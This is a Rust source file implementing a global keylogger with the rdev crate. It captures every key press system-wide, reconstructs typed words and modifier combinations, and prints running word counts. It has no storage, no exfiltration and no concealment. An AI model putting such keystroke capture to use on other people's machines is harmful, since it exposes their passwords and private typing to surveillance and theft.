use std::collections::BTreeMap;
//use std::fs::OpenOptions;
//use std::io::Write;
use rdev::{EventType::*, Key::*};

/// Keylogger loop
pub fn log_keys() {
    // keep tack of cursor position using left and right arrow keys
    let mut cursor_pos = 0;
    // hold current word like this ["apple"]
    let mut key_buffer: Vec<String> = Vec::new();
    // hold all logged keys, separated in words, like this ["hello", "SPACE", "world!"]
    let mut words = BTreeMap::new();
    let mut mod_pressed = false;

    // blocking
    rdev::listen(move |event| {
        println!("logged so far: {:?}", words);

        match event.event_type {
            KeyPress(key_pressed) => {
                match key_pressed {
                    Space | Return | Enter => {
                        log_sequence(&mut words, format!("{:?}", key_pressed));
                        flush_buffer(&mut words, &mut key_buffer, &mut cursor_pos);
                    }
                    LeftArrow => {
                        log_sequence(&mut words, format!("{:?}", key_pressed));
                        if cursor_pos >= 1 {
                            cursor_pos -= 1;
                        }
                    }
                    RightArrow => {
                        log_sequence(&mut words, format!("{:?}", key_pressed));
                        if cursor_pos < key_buffer.len() {
                            cursor_pos += 1;
                        };
                    }
                    Backspace | Delete => {
                        log_sequence(&mut words, format!("{:?}", key_pressed));
                        if cursor_pos >= 1 {
                            match key_pressed {
                                Backspace => {
                                    cursor_pos -= 1;
                                    key_buffer.remove(cursor_pos);
                                }
                                Delete => {
                                    if cursor_pos != key_buffer.len() {
                                        key_buffer.remove(cursor_pos);
                                    }
                                }
                                _ => {
                                    panic!("Forgot a key to match?")
                                }
                            }
                        }
                    }
                    Alt | AltGr | ControlLeft | ControlRight | MetaLeft | MetaRight => {
                        mod_pressed = true;
                        flush_buffer(&mut words, &mut key_buffer, &mut cursor_pos);
                    }
                    _ => {
                        println!(
                            "[pressed] key: {:?}, event.name: {:?}",
                            key_pressed, event.name
                        );
                        // println!("[pressed] {:?}", key);
                        if let Some(keycode) = event.name {
                            // add letters to the buffer, as we want to record words!
                            if keycode.bytes().last() < Some(127_u8)
                                && keycode.bytes().last() > Some(31_u8)
                            {
                                add_key_to_buffer(keycode, &mut key_buffer, cursor_pos).unwrap();
                                cursor_pos += 1;
                            } else {
                                // TODO handel alt, etc
                                // these must be non-letters, adding them
                                log_sequence(&mut words, format!("{:?}", key_pressed));
                                println!("logged not covered key {:?}", key_pressed);
                            }
                        } else {
                            panic!("not recorded {:?}", key_pressed);
                        }
                    }
                }
            }
            KeyRelease(key_released) => {
                match key_released {
                    Alt | AltGr | ControlLeft | ControlRight | MetaLeft | MetaRight => {
                        key_buffer.insert(0, format!("{:?} + ", key_released));
                        flush_buffer(&mut words, &mut key_buffer, &mut cursor_pos);

                        println!("released")
                    }
                    _ => { /* noop for other key releases*/ }
                }
            }
            _ => { /* ignoring all pther events */ }
        }
    })
    .unwrap();
}

fn log_sequence(words: &mut BTreeMap<String, i32>, sequence: String) {
    words
        .entry(sequence)
        .and_modify(|count| *count += 1)
        .or_insert(1);
}

fn flush_buffer(
    words: &mut BTreeMap<String, i32>,
    key_buffer: &mut Vec<String>,
    cursor_pos: &mut usize,
) {
    let sequence = key_buffer.join("");
    key_buffer.clear();
    *cursor_pos = 0;
    log_sequence(words, sequence);
}

fn add_key_to_buffer(
    key: String,
    buffer: &mut Vec<String>,
    pos: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    buffer.insert(pos, key);
    Ok(())
}
